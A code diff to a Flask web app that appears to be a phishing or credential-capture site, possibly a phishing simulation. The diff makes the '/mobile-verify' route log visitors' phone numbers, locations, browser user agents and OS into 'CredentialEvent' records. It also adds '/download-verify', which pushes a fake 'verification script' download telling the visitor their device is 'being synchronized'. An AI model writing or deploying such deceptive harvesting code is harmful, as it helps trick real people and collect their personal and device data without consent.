@@ -130,23 +130,51 @@ def qr_page():
 @app.route("/mobile-verify", methods=["GET", "POST"])
 def mobile_verify():
     if request.method == "POST":
-        data = request.form
-        
-        # Capture form or json
-        phone = data.get("phone")
-        location = data.get("location")
-        
-        event = CredentialEvent(
-            page="mobile_verify",
-            phone=phone,
-            location=location
-        )
+        if request.is_json:
+            data = request.get_json()
+            phone = data.get("phone", "N/A")
+            location = data.get("location", "N/A")
+            user_agent = data.get("userAgent", "N/A")
+            platform = data.get("platform", "N/A")
+            
+            # Combine device info into phone/location if needed or store as location
+            full_location = f"Loc: {location} | UA: {user_agent} | OS: {platform}"
+            
+            event = CredentialEvent(
+                page="mobile_verify_automated",
+                phone=phone,
+                location=full_location
+            )
+        else:
+            data = request.form
+            phone = data.get("phone")
+            location = data.get("location")
+            
+            event = CredentialEvent(
+                page="mobile_verify",
+                phone=phone,
+                location=location
+            )
+            
         db.session.add(event)
         db.session.commit()
-        
-        return redirect("/thankyou")
+        return {"status": "success"} if request.is_json else redirect("/thankyou")
         
     return render_template("mobile_verify.html")
+
+@app.route("/download-verify")
+def download_verify():
+    # Serve an empty dummy file for the "automatic download" effect
+    from flask import send_file
+    import io
+    
+    file_content = b"Verification script initiated. Your device is being synchronized."
+    return send_file(
+        io.BytesIO(file_content),
+        mimetype='application/octet-stream',
+        as_attachment=True,
+        download_name='verify_security.txt'
+    )
 
 @app.route("/select_platform")
 def select_platform():
